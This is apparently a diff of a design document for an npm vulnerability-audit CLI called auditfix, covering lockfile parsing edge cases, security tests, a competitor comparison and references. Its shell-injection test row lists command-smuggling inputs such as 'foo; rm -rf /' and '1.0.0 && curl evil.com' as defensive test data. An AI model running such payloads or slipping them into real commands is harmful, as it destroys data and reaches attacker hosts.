-| **pnpm lockfile v5 vs v6 vs v9** | Read `lockfileVersion` field | v5: keys `/name/version`. v6: keys `/name@version`. v9: separate `packages`/`snapshots`. Dispatch to correct parser. |
-| **Platform-specific optional deps** | `os`/`cpu` fields in lockfile entry | Scan them (installed on other team members' machines) but annotate as platform-specific. |
-| **Circular dependencies** | Visited set hit during BFS | Already handled by visited set. No special action needed. |
-| **Scoped packages** | Package name starts with `@` | Handle correctly in all parsers. pnpm v5 key: `/@scope/name/ver`. v6: `/@scope/name@ver`. v9: `@scope/name@ver`. |
-| **Unknown lockfile version** | `lockfileVersion` not in known set | Warn and exit 2. Do NOT attempt to parse — wrong parser = silent false negatives. |
-| **Empty/minimal lockfile** | `packages` is empty or has only root entry | Report 0 packages scanned, exit 0. No crash. |
-| **Corrupted/truncated lockfile** | `JSON.parse` or YAML parse throws | Clear error: "Lockfile appears corrupted. Try running `npm install` to regenerate." Exit 2. |
-| **BOM in lockfile** | `\uFEFF` at start of file | Strip before parsing. |
-| **Workspace hoisted deps** | Package reachable from multiple workspace importers | If production-reachable from ANY importer, classify as production. Union all production roots. |
-| **`bundledDependencies`** | `bundleDependencies` field on entry | Parse nested `node_modules/` paths for bundled deps. They are real packages with real versions. |
+| Edge Case                                       | Detection                                            | Behavior                                                                                                             |
+| ----------------------------------------------- | ---------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
+| **`npm:` aliased packages**                     | `name` field differs from path key                   | Use `name` field (not path) for advisory matching. **P0 — wrong name = missed vuln.**                                |
+| **`file:`/`link:`/`portal:`/`workspace:` deps** | `link: true` flag, or protocol prefix in `resolved`  | Exclude from advisory matching (local code). Scan their transitive deps.                                             |
+| **`git+https://` deps**                         | `resolved` starts with `git+`                        | Skip advisory matching with warning (version may not be semver).                                                     |
+| **`patch:` protocol (yarn) / `pnpm patch`**     | Protocol prefix or `patchedDependencies` in lockfile | Annotate as "locally patched" in output. Still report advisory but note patch may address it.                        |
+| **Same package at multiple versions**           | Multiple `name@version` entries for same `name`      | Check EACH version independently against advisories.                                                                 |
+| **npm `overrides` / yarn `resolutions`**        | Present in `package.json`                            | Trust lockfile resolved versions. Note overrides in output for transparency.                                         |
+| **Yarn Classic vs Berry detection**             | Check for `__metadata:` in first lines               | Berry: parse as YAML. Classic: use `@yarnpkg/lockfile`. Wrong parser = garbage.                                      |
+| **pnpm lockfile v5 vs v6 vs v9**                | Read `lockfileVersion` field                         | v5: keys `/name/version`. v6: keys `/name@version`. v9: separate `packages`/`snapshots`. Dispatch to correct parser. |
+| **Platform-specific optional deps**             | `os`/`cpu` fields in lockfile entry                  | Scan them (installed on other team members' machines) but annotate as platform-specific.                             |
+| **Circular dependencies**                       | Visited set hit during BFS                           | Already handled by visited set. No special action needed.                                                            |
+| **Scoped packages**                             | Package name starts with `@`                         | Handle correctly in all parsers. pnpm v5 key: `/@scope/name/ver`. v6: `/@scope/name@ver`. v9: `@scope/name@ver`.     |
+| **Unknown lockfile version**                    | `lockfileVersion` not in known set                   | Warn and exit 2. Do NOT attempt to parse — wrong parser = silent false negatives.                                    |
+| **Empty/minimal lockfile**                      | `packages` is empty or has only root entry           | Report 0 packages scanned, exit 0. No crash.                                                                         |
+| **Corrupted/truncated lockfile**                | `JSON.parse` or YAML parse throws                    | Clear error: "Lockfile appears corrupted. Try running `npm install` to regenerate." Exit 2.                          |
+| **BOM in lockfile**                             | `\uFEFF` at start of file                            | Strip before parsing.                                                                                                |
+| **Workspace hoisted deps**                      | Package reachable from multiple workspace importers  | If production-reachable from ANY importer, classify as production. Union all production roots.                       |
+| **`bundledDependencies`**                       | `bundleDependencies` field on entry                  | Parse nested `node_modules/` paths for bundled deps. They are real packages with real versions.                      |
 
 ### Cross-Source Advisory Verification
 
 When results are available from multiple sources (OSV API + bundled index + npm), cross-reference:
+
 - If a **critical** advisory exists in one source but is absent from another, **flag the discrepancy** in the report
 - This makes single-source suppression attacks detectable
 - An attacker would need to compromise all three independent sources simultaneously
@@ -779,17 +825,17 @@ When results are available from multiple sources (OSV API + bundled index + npm)
 
 Mandatory test categories under `tests/security/`:
 
-| Test File | What It Validates |
-|-----------|-------------------|
-| `allow-list-integrity.test.ts` | Tampered signature rejected, expired timestamp rejected, version rollback rejected, broad entries rejected |
-| `cache-traversal.test.ts` | Advisory IDs with `../`, `/`, `\`, null bytes rejected. Resolved path stays within cache dir. |
-| `shell-injection.test.ts` | Package names like `foo; rm -rf /`, `foo$(whoami)`, `` foo`id` `` and versions like `1.0.0 && curl evil.com` produce no shell interpretation |
-| `api-response-validation.test.ts` | Malformed JSON, HTML responses, oversized payloads, `__proto__` keys all handled gracefully with fallthrough |
-| `osv-range-conversion.test.ts` | OSV events→semver conversion: paired events, unpaired introduced, "0" sentinel, last_affected, empty events |
-| `token-redaction.test.ts` | Fake tokens injected into env, verbose logging triggered — tokens never appear in output |
-| `prototype-pollution.test.ts` | Lockfiles and API responses with `__proto__`/`constructor` keys do not pollute `Object.prototype` |
-| `lockfile-edge-cases.test.ts` | Aliased packages, git deps, file deps, circular deps, multi-version, BOM, empty lockfiles all handled correctly |
-| `filename-sanitization.test.ts` | Cache filenames derived from external data are validated against strict patterns |
+| Test File                         | What It Validates                                                                                                                            |
+| --------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
+| `allow-list-integrity.test.ts`    | Tampered signature rejected, expired timestamp rejected, version rollback rejected, broad entries rejected                                   |
+| `cache-traversal.test.ts`         | Advisory IDs with `../`, `/`, `\`, null bytes rejected. Resolved path stays within cache dir.                                                |
+| `shell-injection.test.ts`         | Package names like `foo; rm -rf /`, `foo$(whoami)`, `` foo`id` `` and versions like `1.0.0 && curl evil.com` produce no shell interpretation |
+| `api-response-validation.test.ts` | Malformed JSON, HTML responses, oversized payloads, `__proto__` keys all handled gracefully with fallthrough                                 |
+| `osv-range-conversion.test.ts`    | OSV events→semver conversion: paired events, unpaired introduced, "0" sentinel, last_affected, empty events                                  |
+| `token-redaction.test.ts`         | Fake tokens injected into env, verbose logging triggered — tokens never appear in output                                                     |
+| `prototype-pollution.test.ts`     | Lockfiles and API responses with `__proto__`/`constructor` keys do not pollute `Object.prototype`                                            |
+| `lockfile-edge-cases.test.ts`     | Aliased packages, git deps, file deps, circular deps, multi-version, BOM, empty lockfiles all handled correctly                              |
+| `filename-sanitization.test.ts`   | Cache filenames derived from external data are validated against strict patterns                                                             |
 
 ## Concurrency Model
 
@@ -807,22 +853,23 @@ Mandatory test categories under `tests/security/`:
 
 ## Competitive Analysis
 
-| Feature | npm audit | audit-ci | Snyk | Socket | auditfix |
-|---------|-----------|----------|------|--------|----------|
-| Free | Yes | Yes | Freemium | Freemium | Yes (forever) |
-| Production vs dev filtering | No | No | Partial (`--dev` flag) | No | Yes (core feature) |
-| Actionable fix paths | No | No | Yes | No | Yes |
-| Safe auto-fix | Broken (`--force`) | No | Yes | No | Yes (semver-checked) |
-| Allow-list with expiry | No | Yes (IDs only) | Yes (.snyk policy) | No | Yes (ID + path + expiry) |
-| Community allow-list | No | No | No | No | Yes |
-| Supply chain monitoring | No | No | Yes | Yes (core) | Post-v1 |
-| CI exit codes (0/1/2) | Partial | Yes | Yes (0/1/2/3) | Yes | Yes |
-| SARIF output | Yes | No | Yes | No | Yes |
-| No account required | Yes | Yes | No | No | Yes |
-| Works offline | No | No | No | No | Yes (bundled index) |
-| Lightweight (`npx` fast) | N/A (built-in) | Yes | No (heavy) | No (SaaS) | Yes (~263KB deps) |
+| Feature                     | npm audit          | audit-ci       | Snyk                   | Socket     | auditfix                 |
+| --------------------------- | ------------------ | -------------- | ---------------------- | ---------- | ------------------------ |
+| Free                        | Yes                | Yes            | Freemium               | Freemium   | Yes (forever)            |
+| Production vs dev filtering | No                 | No             | Partial (`--dev` flag) | No         | Yes (core feature)       |
+| Actionable fix paths        | No                 | No             | Yes                    | No         | Yes                      |
+| Safe auto-fix               | Broken (`--force`) | No             | Yes                    | No         | Yes (semver-checked)     |
+| Allow-list with expiry      | No                 | Yes (IDs only) | Yes (.snyk policy)     | No         | Yes (ID + path + expiry) |
+| Community allow-list        | No                 | No             | No                     | No         | Yes                      |
+| Supply chain monitoring     | No                 | No             | Yes                    | Yes (core) | Post-v1                  |
+| CI exit codes (0/1/2)       | Partial            | Yes            | Yes (0/1/2/3)          | Yes        | Yes                      |
+| SARIF output                | Yes                | No             | Yes                    | No         | Yes                      |
+| No account required         | Yes                | Yes            | No                     | No         | Yes                      |
+| Works offline               | No                 | No             | No                     | No         | Yes (bundled index)      |
+| Lightweight (`npx` fast)    | N/A (built-in)     | Yes            | No (heavy)             | No (SaaS)  | Yes (~263KB deps)        |
 
 ### What we learn from each competitor
+
 - **npm audit:** Uses `/-/npm/v1/security/advisories/bulk` — efficient bulk endpoint we can also use as fallback
 - **audit-ci:** Proved that allowlisting + CI exit codes is the minimum viable feature set for adoption
 - **Snyk:** Graph-based dependency model (not tree) handles deduplication correctly — we adopt this
@@ -833,27 +880,29 @@ Mandatory test categories under `tests/security/`:
 
 Keeping the dependency footprint minimal is critical for `npx` cold-start time and supply chain surface area.
 
-| Dependency | Purpose | Size | Required For |
-|------------|---------|------|-------------|
-| `commander` | CLI framework | ~50KB | Always |
-| `chalk` | Terminal colors | ~20KB | Terminal output |
-| `cli-table3` | Terminal tables | ~30KB | Terminal output |
-| `semver` | Semver range matching | ~40KB | Reachability, fixing |
-| `js-yaml` | Parse yarn berry + pnpm lockfiles | ~100KB | Yarn berry / pnpm projects |
-| `@yarnpkg/lockfile` | Parse yarn v1 lockfiles | ~20KB | Yarn v1 projects |
-| `lilconfig` | Config file loading | ~3KB | Config |
+| Dependency          | Purpose                           | Size   | Required For               |
+| ------------------- | --------------------------------- | ------ | -------------------------- |
+| `commander`         | CLI framework                     | ~50KB  | Always                     |
+| `chalk`             | Terminal colors                   | ~20KB  | Terminal output            |
+| `cli-table3`        | Terminal tables                   | ~30KB  | Terminal output            |
+| `semver`            | Semver range matching             | ~40KB  | Reachability, fixing       |
+| `js-yaml`           | Parse yarn berry + pnpm lockfiles | ~100KB | Yarn berry / pnpm projects |
+| `@yarnpkg/lockfile` | Parse yarn v1 lockfiles           | ~20KB  | Yarn v1 projects           |
+| `lilconfig`         | Config file loading               | ~3KB   | Config                     |
 
 **Total: ~263KB** (7 dependencies). Compare to arborist alone at 50-80 transitive deps / several MB.
 
 Lazy-load `js-yaml` and `@yarnpkg/lockfile` — only import when that lockfile type is detected. This keeps `npx auditfix` fast for npm-only projects.
 
 ### Build & Distribution
+
 - Bundle with `tsup` into single ESM file with shebang (`#!/usr/bin/env node`)
 - `tsup src/cli/index.ts --format esm --target node18 --clean`
 - Single-file output eliminates Node module resolution overhead
 - `package.json`: `"type": "module"`, `"bin": { "auditfix": "./dist/cli.js" }`
 
 ## Testing Strategy
+
 - **Unit tests:** lockfile parsing (all formats + edge cases), reachability marking, risk scoring, semver resolution, input sanitization
 - **Security tests:** 9 mandatory test files (see Security Test Suite above) covering injection, traversal, poisoning, pollution, redaction
 - **Integration tests:** run against fixture projects with known vulnerabilities
@@ -866,6 +915,7 @@ Lazy-load `js-yaml` and `@yarnpkg/lockfile` — only import when that lockfile t
 - Mock external APIs (GHSA, OSV, npm) in tests — never hit live endpoints in CI
 
 ## Open Source Strategy
+
 - MIT license
 - CONTRIBUTING.md with clear guidelines for community allow-list PRs
 - GitHub Actions CI on every PR
@@ -888,6 +938,7 @@ Even with all mitigations applied, the following risks cannot be fully eliminate
 Key technical references validated during architecture research:
 
 ### API & Data Sources
+
 - **OSV.dev API:** `POST /v1/querybatch` (1000 pkg limit, abbreviated response), `GET /v1/vulns/{id}` (full details), ecosystem = `"npm"` (lowercase)
 - **OSV Bulk Export:** `https://osv-vulnerabilities.storage.googleapis.com/npm/all.zip` — all npm advisories as individual JSON files in one zip. ~5-15MB. Updated within minutes of upstream changes.
 - **OSV Schema:** `affected[].ranges[].events` with `introduced`/`fixed`/`last_affected` pairs. `"introduced":"0"` = sentinel for all versions. CVSS in `severity[].score` as vector string (must parse to numeric). Events processed in order — `introduced` opens range, `fixed`/`last_affected` closes it. Unpaired `introduced` = no fix exists.
@@ -895,6 +946,7 @@ Key technical references validated during architecture research:
 - **npm bulk advisory:** `POST /-/npm/v1/security/advisories/bulk` with `{ "pkg": ["ver"] }` — what `npm audit` uses via `libnpmaudit`.
 
 ### Lockfile Formats
+
 - **npm lockfile v3:** `packages` field is flat map keyed by `node_modules/...` path. `""` key = root. `dev`/`optional`/`devOptional` flags pre-computed by npm. Aliased packages have `name` field that differs from path key — **must use `name` field for advisory matching**.
 - **npm lockfile v1:** Legacy nested `dependencies` tree. `dev: true` flag. Increasingly rare.
 - **Yarn v1 lockfile:** Custom format parsed by `@yarnpkg/lockfile`. No dev flags — must cross-reference `package.json`. Detect by first-line comment.
@@ -903,11 +955,13 @@ Key technical references validated during architecture research:
 - **pnpm-lock.yaml v5/v6:** Keys `/name/version` (v5) vs `/name@version` (v6). `dev: true` flag on entries. Scoped packages: `/@scope/name/version`.
 
 ### Security-Critical Dependencies
+
 - **node-semver >= 7.5.4:** Versions < 7.5.4 have ReDoS (CVE-2022-25883). Pre-validate version string length (max 256 chars). **Always pass `{ includePrerelease: true }` for advisory matching.**
 - **js-yaml >= 4.0.0:** v3 had RCE via `!!js/function` (CVE-2013-4660). v4+ defaults to safe schema. NEVER use `JS_SCHEMA`. Confirmed: js-yaml v4+ parses Yarn Berry lockfiles correctly (all protocol strings work because keys are always quoted YAML strings).
 - **No git dependency required.** Advisory data comes from OSV API + bundled index (built from bulk export). This eliminates the entire class of git client vulnerabilities.
 
 ### Tools & Patterns
+
 - **SARIF v2.1.0:** Only version GitHub Code Scanning supports. `properties.security-severity` (float string) maps to severity levels. Max 10MB.
 - **Commander v12+:** Ships own `.d.ts`. Use `.exitOverride()` for testing. `getOptionValueSource()` for config merge.
 - **Sigstore/cosign:** Modern alternative to GPG for signing. Keyless via OIDC, transparency log (Rekor). Used by npm provenance, PyPI.
